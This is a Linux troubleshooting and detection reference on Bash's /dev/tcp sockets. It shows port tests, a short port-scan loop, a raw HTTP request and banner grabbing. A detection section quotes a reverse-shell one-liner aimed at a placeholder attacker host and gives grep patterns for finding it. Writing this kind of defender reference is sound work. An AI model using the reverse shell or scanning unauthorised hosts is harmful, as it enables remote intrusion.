---
title: Bash Pure Networking & /dev/tcp Socket Mechanics
type: entry
platforms:
  - Linux
languages:
  - Bash
tasks:
  - Troubleshooting
  - Investigation
verified: true
last_verified: 2026-10-12
difficulty: intermediate
tags:
  - bash
  - networking
  - sockets
  - dev-tcp
---

# Bash Pure Networking & /dev/tcp Socket Mechanics

Bash includes native `/dev/tcp` and `/dev/udp` pseudo-devices, enabling port testing and HTTP transactions without installing external dependencies like `netcat` or `telnet`.

`/dev/tcp/<host>/<port>` is not a real file: Bash itself opens a socket when it sees that path in a redirection. It works in `bash` only (not `sh`/`dash`), and only if Bash was built with network redirections, which is the default on mainstream distributions.

## 1. Fast Port Reachability Test

```bash
# Test if a TCP socket is open with a 3-second timeout
timeout 3 bash -c "</dev/tcp/10.0.0.1/443" && echo "Port 443 is OPEN" || echo "Port 443 is CLOSED"
```

Scan a short list of ports on one host (authorised targets only):

```bash
host=10.0.0.1
for port in 22 80 443 445 3389 5985; do
    if timeout 2 bash -c "</dev/tcp/${host}/${port}" 2>/dev/null; then
        echo "${host}:${port} open"
    fi
done
```

"Closed" here also covers filtered (a firewall dropping packets ends in the timeout) and DNS failures.

## 2. Minimal HTTP GET in Pure Bash

```bash
exec 3<>/dev/tcp/example.com/80
printf 'GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n' >&3
cat <&3
exec 3<&-
exec 3>&-
```

`exec 3<>` opens file descriptor 3 for reading and writing on the socket; the last two lines close it. This is plain HTTP only: there is no TLS, so use `curl` or `openssl s_client -connect host:443` for HTTPS.

## 3. Grab a service banner

```bash
# SSH and SMTP servers announce themselves on connect
timeout 3 bash -c 'exec 3<>/dev/tcp/10.0.0.5/22; head -n 1 <&3'
```

## 4. Detect it: `/dev/tcp` in attacks

The same feature is a classic reverse shell (`bash -i >& /dev/tcp/<attacker>/<port> 0>&1`) and appears in malicious cron jobs and web-shell payloads ([T1059.004](https://attack.mitre.org/techniques/T1059/004/)). Look for it in:

```bash
# Persistence and scripts on a host
grep -rEn '/dev/(tcp|udp)/' /etc/cron* /var/spool/cron /etc/systemd /home/*/.bashrc /root/.bashrc /tmp 2>/dev/null

# Shell history
grep -h '/dev/tcp' /home/*/.bash_history /root/.bash_history 2>/dev/null
```

In process telemetry, a `bash -i` whose standard input and output are a network socket (Sysmon for Linux, auditd `execve` with the command line, EDR) is a strong reverse-shell signal.

→ [Scheduled Task and Cron Persistence Review](../../tasks/threat-hunting/scheduled-task-persistence-review.md)

## Related

- [Bash overview](index.md)
- [Network Investigation](../../tasks/investigation/network-investigation.md)

## Sources

- [GNU Bash manual — Redirections (/dev/tcp)](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)
- [MITRE ATT&CK T1059.004 — Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
